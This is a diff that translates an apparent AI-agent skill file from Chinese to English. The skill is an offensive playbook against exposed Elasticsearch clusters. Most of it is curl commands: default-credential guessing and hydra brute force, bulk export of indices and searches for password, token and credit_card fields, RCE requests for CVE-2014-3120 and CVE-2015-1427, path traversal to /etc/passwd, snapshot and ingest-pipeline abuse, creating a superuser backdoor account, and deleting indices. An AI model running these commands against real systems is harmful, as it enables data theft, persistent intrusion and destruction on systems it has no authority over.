@@ -1,143 +1,145 @@
 ---
 name: elasticsearch-attack
-description: "Elasticsearch 未授权访问与利用。当发现目标开放 9200/9300 端口、Elasticsearch 服务无认证、需要从 ES 获取索引数据或实现远程命令执行时使用。覆盖未授权访问、认证绕过、索引数据窃取、MVEL/Groovy 脚本 RCE（旧版本）、快照仓库滥用、集群信息泄露、动态脚本注入、Ingest Pipeline 滥用、路径穿越"
+description: "Elasticsearch unauthorized access and exploitation. Use when you find that a target exposes ports 9200/9300, that the Elasticsearch service has no authentication, or when you need to extract index data or achieve remote command execution. Covers unauthorized access, authentication bypass, index data theft, MVEL/Groovy script RCE (older versions), snapshot repository abuse, cluster information leakage, dynamic script injection, Ingest Pipeline abuse, and path traversal"
+zh-signals: "Elasticsearch 未授权访问与利用技能，覆盖 9200/9300 探测、认证绕过、索引窃取与脚本 RCE。信号:Elasticsearch,未授权访问,认证绕过,索引窃取,脚本RCE"
+when-to-use: "Use when a target exposes Elasticsearch on ports 9200/9300 without authentication, and you need to enumerate cluster data, bypass auth, steal indices, or test script-based RCE."
 metadata:
-  tags: "elasticsearch,es,9200,9300,未授权,rce,groovy,mvel,snapshot,ingest-pipeline,kibana,索引"
+  tags: "elasticsearch,es,9200,9300,unauthorized,rce,groovy,mvel,snapshot,ingest-pipeline,kibana,index"
   category: "exploit"
 ---
 
-# Elasticsearch 未授权访问与利用
+# Elasticsearch Unauthorized Access and Exploitation
 
-Elasticsearch 默认监听 9200 端口且无认证保护，暴露在网络上时面临大量敏感数据泄露和潜在的 RCE 风险。
+Elasticsearch listens on port 9200 by default with no authentication, and when exposed to the network it faces a large amount of sensitive data leakage and potential RCE risk.
 
-## ⛔ 深入参考（必读）
-- 完整利用命令和 payload → 读 [references/attack-techniques.md](references/attack-techniques.md)
+## ⛔ Further Reading (Must Read)
+- Full exploitation commands and payloads → read [references/attack-techniques.md](references/attack-techniques.md)
 
 ---
 
-## Phase 1: 服务发现与版本识别
+## Phase 1: Service Discovery and Version Identification
 
-### 1.1 基础探测
+### 1.1 Basic Probing
 
 ```bash
-# 直接请求根路径，返回集群名称和版本号
+# Request the root path directly, it returns the cluster name and version number
 curl http://TARGET:9200/
 
-# 集群健康状态
+# Cluster health status
 curl http://TARGET:9200/_cat/health?v
 curl http://TARGET:9200/_cluster/health?pretty
 ```
 
-### 1.2 Nmap 扫描
+### 1.2 Nmap Scanning
 
 ```bash
-# HTTP 服务识别
+# HTTP service identification
 nmap -sV -p 9200,9300 TARGET
 
-# 通用 HTTP 指纹脚本；ES 细节枚举优先使用后续 curl API
+# Generic HTTP fingerprint scripts; for detailed ES enumeration prefer the curl APIs below
 nmap -p 9200 --script http-title,http-headers TARGET
 ```
 
-**关键判断**：
-- 返回 JSON 含 `cluster_name` / `version.number` → 无认证，直接进入 Phase 3
-- 返回 401 / 403 → 有认证，进入 Phase 2
-- `version.number` < 1.2 → MVEL RCE 可用（CVE-2014-3120）
-- `version.number` 1.3.x - 1.4.x → Groovy 沙箱逃逸 RCE 可用（CVE-2015-1427）
-- `version.number` >= 5.x → 关注 Painless 脚本和 Ingest Pipeline
+**Key Decision**:
+- The returned JSON contains `cluster_name` / `version.number` → no authentication, go directly to Phase 3
+- 401 / 403 returned → authentication is enabled, go to Phase 2
+- `version.number` < 1.2 → MVEL RCE is available (CVE-2014-3120)
+- `version.number` 1.3.x - 1.4.x → Groovy sandbox escape RCE is available (CVE-2015-1427)
+- `version.number` >= 5.x → focus on Painless scripts and Ingest Pipelines
 
 ---
 
-## Phase 2: 未授权/认证绕过检测
+## Phase 2: Unauthorized Access / Authentication Bypass Detection
 
-### 2.1 无认证确认
+### 2.1 Confirming the Absence of Authentication
 
 ```bash
-# 直接访问核心 API 端点
+# Access the core API endpoints directly
 curl http://TARGET:9200/_cat/indices?v
 curl http://TARGET:9200/_cluster/state?pretty
 curl http://TARGET:9200/_nodes/stats?pretty
 ```
 
-### 2.2 默认凭证与 X-Pack
+### 2.2 Default Credentials and X-Pack
 
 ```bash
-# 常见默认凭证: elastic:changeme, elastic:elastic, admin:admin
+# Common default credentials: elastic:changeme, elastic:elastic, admin:admin
 curl -u elastic:changeme http://TARGET:9200/
 curl -u elastic:elastic http://TARGET:9200/
 curl -u admin:admin http://TARGET:9200/
 
-# 检查 X-Pack Security 是否启用
+# Check whether X-Pack Security is enabled
 curl http://TARGET:9200/_xpack/security/user
 curl http://TARGET:9200/_security/user
 
-# 暴力破解
+# Brute force
 hydra -L users.txt -P passwords.txt TARGET http-get /_search
 ```
 
 ---
 
-## Phase 3: 攻击决策树
+## Phase 3: Attack Decision Tree
 
 ```
-连接成功？
+Connection successful?
 ├─ ES < 1.2 → MVEL RCE (/_search + script filter, CVE-2014-3120)
-├─ ES 1.3.x-1.4.x → Groovy 沙箱逃逸 RCE (CVE-2015-1427)
-├─ ES < 1.4.3 + _plugin → 路径穿越读文件
-├─ ES >= 6.x + 无认证 → 索引数据批量导出
-│   ├─ _cat/indices 列出所有索引
-│   ├─ _search + _scroll 批量导出
-│   └─ 搜索敏感字段 (password, token, email, credit_card)
-├─ 有快照仓库权限 → 快照数据窃取/恢复
-├─ 有 Ingest Pipeline 权限 → Pipeline 注入（数据修改）
-├─ 有动态脚本权限 → 脚本存储与执行
-├─ Kibana 暴露 → Kibana 控制台利用
-└─ 有集群管理权限 → 配置篡改 / 恶意用户创建
+├─ ES 1.3.x-1.4.x → Groovy sandbox escape RCE (CVE-2015-1427)
+├─ ES < 1.4.3 + _plugin → path traversal to read files
+├─ ES >= 6.x + no authentication → bulk index data export
+│   ├─ _cat/indices lists all indices
+│   ├─ _search + _scroll for bulk export
+│   └─ Search sensitive fields (password, token, email, credit_card)
+├─ Snapshot repository access → snapshot data theft/restoration
+├─ Ingest Pipeline access → Pipeline injection (data modification)
+├─ Dynamic script access → script storage and execution
+├─ Kibana exposed → Kibana console exploitation
+└─ Cluster admin access → configuration tampering / malicious user creation
 ```
 
-**前置信息收集**：
+**Preliminary Information Gathering**:
 
 ```bash
-# 获取版本号（决定攻击路径）
+# Get the version number (determines the attack path)
 curl -s http://TARGET:9200/ | grep number
 
-# 列出所有索引（判断数据规模）
+# List all indices (judge the data scale)
 curl http://TARGET:9200/_cat/indices?v
 
-# 获取集群设置
+# Get the cluster settings
 curl http://TARGET:9200/_cluster/settings?pretty
 
-# 获取所有索引映射（了解数据结构）
+# Get all index mappings (understand the data structure)
 curl http://TARGET:9200/_all/_mapping?pretty
 ```
 
 ---
 
-## Phase 4: 数据窃取速查
+## Phase 4: Data Theft Quick Reference
 
-### 4.1 索引枚举
+### 4.1 Index Enumeration
 
 ```bash
-# 列出所有索引
+# List all indices
 curl http://TARGET:9200/_cat/indices?v
 
-# 列出所有别名
+# List all aliases
 curl http://TARGET:9200/_aliases?pretty
 
-# 获取索引映射（字段结构）
+# Get the index mapping (field structure)
 curl http://TARGET:9200/INDEX_NAME/_mapping?pretty
 ```
 
-### 4.2 数据搜索与导出
+### 4.2 Data Search and Export
 
 ```bash
-# 搜索所有数据（默认返回 10 条）
+# Search all data (returns 10 records by default)
 curl -X POST http://TARGET:9200/_search?pretty \
   -H 'Content-Type: application/json' -d '{
     "query": {"match_all": {}},
     "size": 1000
   }'
 
-# 搜索敏感字段
+# Search sensitive fields
 curl -X POST http://TARGET:9200/_search?pretty \
   -H 'Content-Type: application/json' -d '{
     "query": {
@@ -149,17 +151,17 @@ curl -X POST http://TARGET:9200/_search?pretty \
   }'
 ```
 
-### 4.3 大量数据用 _scroll API
+### 4.3 Large Data Volumes with the _scroll API
 
 ```bash
-# 初始化 scroll
+# Initialize the scroll
 curl -X POST http://TARGET:9200/INDEX_NAME/_search?scroll=5m \
   -H 'Content-Type: application/json' -d '{
     "query": {"match_all": {}},
     "size": 5000
   }'
 
-# 持续获取（使用上一步返回的 _scroll_id）
+# Keep fetching (use the _scroll_id returned by the previous step)
 curl -X POST http://TARGET:9200/_search/scroll \
   -H 'Content-Type: application/json' -d '{
     "scroll": "5m",
@@ -167,13 +169,13 @@ curl -X POST http://TARGET:9200/_search/scroll \
   }'
 ```
 
-→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取 elasticdump 批量导出命令
+→ Read [references/attack-techniques.md](references/attack-techniques.md) for the elasticdump bulk export commands
 
 ---
 
-## Phase 5: RCE 速查
+## Phase 5: RCE Quick Reference
 
-### 5.1 MVEL 表达式注入 (ES < 1.2, CVE-2014-3120)
+### 5.1 MVEL Expression Injection (ES < 1.2, CVE-2014-3120)
 
 ```bash
 curl -X POST http://TARGET:9200/_search?pretty \
@@ -191,7 +193,7 @@ curl -X POST http://TARGET:9200/_search?pretty \
   }'
 ```
 
-### 5.2 Groovy 沙箱逃逸 (ES 1.3.x-1.4.x, CVE-2015-1427)
+### 5.2 Groovy Sandbox Escape (ES 1.3.x-1.4.x, CVE-2015-1427)
 
 ```bash
 curl -X POST http://TARGET:9200/_search?pretty \
@@ -208,43 +210,43 @@ curl -X POST http://TARGET:9200/_search?pretty \
   }'
 ```
 
-### 5.3 路径穿越 (ES < 1.4.3)
+### 5.3 Path Traversal (ES < 1.4.3)
 
 ```bash
 curl http://TARGET:9200/_plugin/head/../../../../../../etc/passwd
 curl http://TARGET:9200/_plugin/head/../../../../../../etc/elasticsearch/elasticsearch.yml
 ```
 
-→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整 RCE payload
+→ Read [references/attack-techniques.md](references/attack-techniques.md) for the complete RCE payloads
 
 ---
 
-## Phase 6: 其他攻击向量
+## Phase 6: Other Attack Vectors
 
-### 6.1 快照仓库滥用
+### 6.1 Snapshot Repository Abuse
 
 ```bash
-# 注册快照仓库
+# Register a snapshot repository
 curl -X PUT http://TARGET:9200/_snapshot/exfil_repo \
   -H 'Content-Type: application/json' -d '{
     "type": "fs",
     "settings": {"location": "/tmp/snapshots"}
   }'
 
-# 创建快照
+# Create a snapshot
 curl -X PUT http://TARGET:9200/_snapshot/exfil_repo/snap_1
 
-# 恢复快照到攻击者可达路径
+# Restore the snapshot to a path reachable by the attacker
 curl -X POST http://TARGET:9200/_snapshot/exfil_repo/snap_1/_restore
 ```
 
-### 6.2 Ingest Pipeline 注入
+### 6.2 Ingest Pipeline Injection
 
 ```bash
-# 列出现有 Pipeline
+# List the existing pipelines
 curl http://TARGET:9200/_ingest/pipeline?pretty
 
-# 创建恶意 Pipeline
+# Create a malicious pipeline
 curl -X PUT http://TARGET:9200/_ingest/pipeline/malicious \
   -H 'Content-Type: application/json' -d '{
     "description": "data interceptor",
@@ -254,42 +256,42 @@ curl -X PUT http://TARGET:9200/_ingest/pipeline/malicious \
   }'
 ```
 
-### 6.3 集群配置篡改
+### 6.3 Cluster Configuration Tampering
 
 ```bash
-# 创建后门用户（需 X-Pack 管理权限）
+# Create a backdoor user (requires X-Pack admin privileges)
 curl -X POST http://TARGET:9200/_xpack/security/user/attacker \
   -H 'Content-Type: application/json' -d '{
     "password": "password123",
     "roles": ["superuser"]
   }'
 
-# 删除索引
+# Delete an index
 curl -X DELETE http://TARGET:9200/INDEX_NAME
 ```
 
-→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整技术细节
+→ Read [references/attack-techniques.md](references/attack-techniques.md) for the complete technical details
 
 ---
 
-## 工具速查
+## Tool Quick Reference
 
-| 工具 | 用途 |
+| Tool | Purpose |
 |------|------|
-| curl | ES REST API 交互（所有操作的基础） |
-| elasticsearch-head | 集群管理 Web UI 插件 |
-| Kibana | ES 数据可视化和 Dev Tools 查询 |
-| elasticdump | 索引数据批量导出/导入 |
-| nmap | 端口扫描、服务识别和通用 HTTP 指纹脚本 |
-| hydra | HTTP 认证暴力破解 |
+| curl | ES REST API interaction (the basis of all operations) |
+| elasticsearch-head | Cluster administration web UI plugin |
+| Kibana | ES data visualization and Dev Tools queries |
+| elasticdump | Bulk index data export/import |
+| nmap | Port scanning, service identification, and generic HTTP fingerprint scripts |
+| hydra | HTTP authentication brute force |
 
 ---
 
-## 注意事项
+## Notes
 
-- ES 操作全部通过 REST API（HTTP），所有命令使用 curl
-- `_scroll` API 对大量数据导出比 `_search` 更高效，避免一次性拉取全部数据
-- 旧版本 RCE：MVEL 在 ES < 1.2 有效，Groovy 沙箱逃逸在 ES 1.3.x-1.4.x 有效，现代版本已移除
-- `_search?size=10000` 有上限限制，超过需使用 `_scroll` 或 `search_after`
-- 删除索引 (`DELETE /index`) 不可逆，操作前确认目标
-- 生产环境避免对大索引执行 `match_all` 全量查询，优先分批导出
+- All ES operations go through the REST API (HTTP); every command uses curl
+- The `_scroll` API is more efficient than `_search` for large data exports and avoids pulling all the data at once
+- RCE in older versions: MVEL works on ES < 1.2, Groovy sandbox escape works on ES 1.3.x-1.4.x, and both were removed in modern versions
+- `_search?size=10000` has an upper limit; beyond that, use `_scroll` or `search_after`
+- Deleting an index (`DELETE /index`) is irreversible — confirm the target before operating
+- In production environments, avoid running full `match_all` queries on large indices; export in batches instead
